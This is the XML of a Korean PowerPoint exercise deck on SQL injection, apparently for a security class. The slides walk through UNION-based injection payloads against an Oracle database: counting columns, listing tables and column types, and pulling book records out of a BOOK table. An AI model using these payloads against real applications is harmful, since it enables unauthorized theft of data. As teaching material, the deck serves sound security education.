            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="2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6530264-0B23-C6BD-AC23-5D6CC83F1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53255"/>
            <a:ext cx="10515600" cy="3696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12D9CF-90AA-BA95-FF41-08F6A0A4E0E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1783923"/>
            <a:ext cx="3825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컬럼명과 각 컬럼의 타입 정보 탈취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5239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D961C-4ED3-0E0A-D1C0-6147FE07E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BOOKNO, BOOKNAME,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BOOK --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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25006B5-4828-5349-8678-5E0C42B48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6318"/>
            <a:ext cx="10515600" cy="4329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DCA49D-A286-6A8F-8ACF-4203C19D4800}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1506022"/>
            <a:ext cx="3116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BOOKNO, BOOKNAME </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>탈취</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1720326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DC05F-9426-3D76-7EC8-F53E56602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BOOK</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>AUTHOR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>PUBNO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BOOK --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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AF4E94B-ABB0-471E-F7EA-E4453D324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072" y="1825625"/>
            <a:ext cx="10483855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361EF7-ADEB-E248-EF49-1FF0657B3FB5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1456293"/>
            <a:ext cx="319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BOOKAUTHOR, PUBNO </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>탈취</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2066877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97252-DBDE-D74A-54B8-393F0236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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>TO_CHAR(BOOKDATE)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0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BOOK --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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DCC0523-05F5-EB21-62BE-37F37139D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4673"/>
            <a:ext cx="10515600" cy="42132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58710A-0DEC-DE17-40A0-0EE8FBA92974}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1525341"/>
            <a:ext cx="3440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BOOKDATE </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>문자로 바꿔서 탈취</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="826991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42F74-46B5-1042-61C5-C5A695EC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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>null</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>null</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>BOOKPRICE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BOOK --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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6A8A599-54B3-EB58-EAAE-85207378D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0171" y="1825625"/>
            <a:ext cx="102516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29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DB999-6B89-82C2-93C4-2BA16CBB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' OR 1=1 UNION SELECT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>null</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>null</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t>BOOKPRICE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, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0" err="1"/>
              <a:t>null</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0" err="1"/>
              <a:t>from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="ko-KR" sz="2800" dirty="0"/>
              <a:t> BOOK --</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ko-KR" altLang="en-US" sz="28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05A67A2-035E-5A7B-392A-EDF60B9DC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5711" y="1825625"/>
            <a:ext cx="9920577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DD7B4-4F8A-6AA1-5F24-B6FDA1BE9F91}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1456293"/>
            <a:ext cx="2052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BOOKSTOCK </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>탈취</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3458299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479</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>와이드스크린</PresentationFormat>
  <Paragraphs>43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SQL Injection 연습문제</vt:lpstr>
      <vt:lpstr>PowerPoint 프레젠테이션</vt:lpstr>
      <vt:lpstr>' or 1=1 order by 7 --</vt:lpstr>
      <vt:lpstr>' OR 1=1 UNION SELECT null,null,null,null, null,null from dual --</vt:lpstr>
      <vt:lpstr>' OR 1=1 UNION SELECT ‘a’,null,null,null, null,null from dual --</vt:lpstr>
      <vt:lpstr>' OR 1=1 UNION SELECT ‘a’,’b’,null,null, null,null from dual --</vt:lpstr>
      <vt:lpstr>' OR 1=1 UNION SELECT ‘a’,’b’,(   ),null, null,null from dual --</vt:lpstr>
      <vt:lpstr>' OR 1=1 UNION SELECT ‘a’,’b’,0,’c’, null,null from dual --</vt:lpstr>
      <vt:lpstr>' OR 1=1 UNION SELECT ‘a’,’b’,0,’c’,(   ),null from dual --</vt:lpstr>
      <vt:lpstr>' OR 1=1 UNION SELECT ‘a’,’b’,0,’c’,null,’e’ from dual --</vt:lpstr>
      <vt:lpstr>＇ or 1=1 UNION SELECT table_name,null,null,null,null,null from user_tables --</vt:lpstr>
      <vt:lpstr>' OR 1=1 UNION SELECT column_name, data_type, null, null, null, null from ALL_TAB_COLUMNS where table_name=‘Book' --</vt:lpstr>
      <vt:lpstr>' OR 1=1 UNION SELECT BOOKNO, BOOKNAME, null, null, null, null from BOOK --</vt:lpstr>
      <vt:lpstr>' OR 1=1 UNION SELECT BOOKAUTHOR, PUBNO, null, null, null, null from BOOK --</vt:lpstr>
      <vt:lpstr>' OR 1=1 UNION SELECT TO_CHAR(BOOKDATE), null, null, null, null, null from BOOK --</vt:lpstr>
      <vt:lpstr>' OR 1=1 UNION SELECT null, null, BOOKPRICE, null, null, null from BOOK --</vt:lpstr>
      <vt:lpstr>' OR 1=1 UNION SELECT null, null, BOOKPRICE, null, null, null from BOOK --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이다연</dc:creator>
  <cp:lastModifiedBy>이다연</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-09-02T08:17:14Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-02T09:25:35Z</dcterms:modified>
</cp:coreProperties>
</file>